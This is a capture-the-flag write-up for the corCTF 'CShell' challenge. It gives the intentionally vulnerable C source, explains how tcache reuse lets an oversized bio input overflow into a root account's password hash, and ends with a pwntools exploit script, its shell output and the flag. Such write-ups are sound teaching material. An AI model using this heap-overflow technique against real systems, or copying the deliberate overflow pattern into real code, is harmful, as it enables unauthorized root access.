# CShell
```
My friend Hevr thinks I can't code, so I decided to prove him wrong by making a restricted shell in which he is unable to play squad. I must add that my programming skills are very cache money...
```

## Challenge
> TLDR: Abuse tcachebin and then perform heap overflow

The challenge provides me with a binary program and its source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>

//gcc Cshell.c -static -lcrypt -o Cshell
struct users {
	char name[8];
	char passwd[35];
};

struct tracker{
	struct tracker *next;
	struct users *ptr;
	char name[8];
	long int id;
};

char * alex_buff;
char * Charlie_buff;
char * Johnny_buff;
char * Eric_buff;

struct users *user;
struct users *root;

struct tracker *root_t;
struct tracker *user_t;

char *username[8];
char *userbuffer;
int uid=1000;
int length;
char salt[5] = "1337\0";
char *hash;
void setup(){
	char password_L[33];
	puts("Welcome to Cshell, a very restricted shell.\nPlease create a profile.");
	printf("Enter a username up to 8 characters long.\n> ");
	scanf("%8s",username);
	printf("Welcome to the system %s, you are our 3rd user. We used to have more but some have deleted their accounts.\nCreate a password.\n> ",username);
	scanf("%32s",&password_L);
	hash = crypt(password_L,salt);
	printf("How many characters will your bio be (200 max)?\n> ");
	scanf("%d",&length);
	userbuffer = malloc(length + 8);
	printf("Great, please type your bio.\n> ");
	getchar();
	fgets((userbuffer + 8),201,stdin);
}

void logout(){
	fflush(stdin);
	getchar();
	struct tracker *ptr;
	printf("Username:");
	char username_l[9];
	char password_l[32];
	char *hash;
	scanf("%8s",username_l);
	for (ptr = root_t; ptr != NULL; ptr = root_t->next) {


        if (strcmp(ptr->name, username_l) == 0) {
		printf("Password:");
	    scanf("%32s",password_l);
	    hash = crypt(password_l,salt);
	    if (strcmp(hash,ptr->ptr->passwd) == 0){
		    strcpy(username,ptr->name);
		    uid = ptr->id;
		    puts("Authenticated!");
		    menu();
	    }
	    else{
		    puts("Incorrect");
		    logout();
	    }
			 
        }
	else
	{
		if (ptr->next==0)
		{
			puts("Sorry no users with that name.");
			logout();
		}
	}
    }
}
void whoami(){
	printf("%s, uid: %d\n",username,uid);
	menu();
}
void bash(){

	if (uid == 0){
		system("bash");
	}
	else 
	{
		puts("Who do you think you are?");
		exit(0);
	}

}

void squad(){
	puts("..");
	menu();
}

void banner(){

puts("       /\\");
puts("      {.-}");
puts("     ;_.-'\\");
puts("    {    _.}_");
puts("    \\.-' /  `,");
puts("     \\  |    /");
puts("      \\ |  ,/");
puts("       \\|_/");
puts("");
}
void menu(){
	puts("+----------------------+");
	puts("|        Commands      |");
	puts("+----------------------+");
	puts("| 1. logout            |");
	puts("| 2. whoami            |");
	puts("| 3. bash (ROOT ONLY!) |");
	puts("| 4. squad             |");
	puts("| 5. exit              |");
	puts("+----------------------+");
	int option;
	printf("Choice > ");
	scanf("%i",&option);
	switch(option){
		case 1:
			logout();
		case 2:
			whoami();
		case 3:
			bash();
		case 4:
			squad();
		case 5:
			exit(0);
		default:
			puts("[!] invalid choice \n");
			break;
	}
}
void history(){
	alex_buff = malloc(0x40);
	char alex_data[0x40] = "Alex\nJust a user on this system.\0";
	char Johnny[0x50] = "Johnny\n Not sure why I am a user on this system.\0";
	char Charlie[0x50] ="Charlie\nI do not trust the security of this program...\0";
	char Eric[0x60] = "Eric\nThis is one of the best programs I have ever used!\0";
	strcpy(alex_buff,alex_data);
	Charlie_buff = malloc(0x50);
	strcpy(Charlie_buff,Charlie);
	Johnny_buff = malloc(0x60);
	strcpy(Johnny_buff,Johnny);
	Eric_buff = malloc(0x80);
	strcpy(Eric_buff,Eric);
	free(Charlie_buff);
	free(Eric_buff);
}

int main(){
	setvbuf(stdout, 0 , 2 , 0);
	setvbuf(stdin, 0 , 2 , 0);
	root_t = malloc(sizeof(struct tracker));
	user_t = malloc(sizeof(struct tracker));
	history();
	banner();
	user = malloc(sizeof(struct users )* 4);
	root = user + 1;
	strcpy(user->name,"tempname");
	strcpy(user->passwd,"placeholder");
	strcpy(root->name,"root");
	strcpy(root->passwd,"guessme:)");
	strcpy(root_t->name,"root");
	root_t->ptr = root;
	root_t->id = 0;
	root_t->next = user_t;
	setup();
	strcpy(user->name,username);
	strcpy(user->passwd,hash);
	strcpy(user_t->name,username);
	user_t->id=1000;
	user_t->ptr = user;
	user_t->next = NULL;
	menu();
	return 0;
}
```

When the program calls `free()`, the memory will be not merged immediately with other freed memory. It is saved into tcachebin due to optimization. In an event where a memory of same size is requested for allocation, the program will allocate the memory in the tcachebin.

So, if I tried to `malloc(0x60)`, it will return me an address of `Eric_buff` which is located in front of `root`.

Visualisation of the heap memory:<br />
| root_t | user_t | alex_buff | Johnny_buff | Eric_buff/recently allocated memory | user | root |

The offset from the recently allocated memory to the `root` is less than 201 bytes. So, we can make use of `fgets()` in `setup()` function to perform heap overflow.

Note: Heap overflow overwrites content of `root` instead of `root_t`

Idea of exploit: perform `malloc(120)` and overflow the content of user and password in `root` (`crypt('b', 1337)` = 13i3VfOPZIccE). Change user to "root" (the username is still named as "root" as the program verifies it with the username in `root_t` instead of `root`) and provide the password "b". Lastly, spawn a shell with option 3.

POC:
```python
from pwn import *

#r = process('./Cshell')
r = remote('pwn.be.ax', 5001)
r.recvuntil(b'> ')
r.sendline(b'a') # random username
r.recvuntil(b'> ')
r.sendline(b'a') # random password
r.recvuntil(b'> ')
r.sendline(b'120') # bio size
r.recvuntil(b'> ')
r.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA13i3VfOPZIccE') # content of bio, crypt('b', 1337) = 13i3VfOPZIccE
r.recvuntil(b'Choice > ')
r.sendline(b'1') # change user to root
r.recvuntil(b'Username:')
r.sendline(b'root')
r.recvuntil(b'Password:')
r.sendline(b'b')
r.recvuntil(b'Choice > ')
r.sendline(b'3') # spawn a shell
r.interactive()
```

Script output:
``` bash
$ python3 solve2.py
[+] Opening connection to pwn.be.ax on port 5001: Done
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}
```

Flag: `corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}`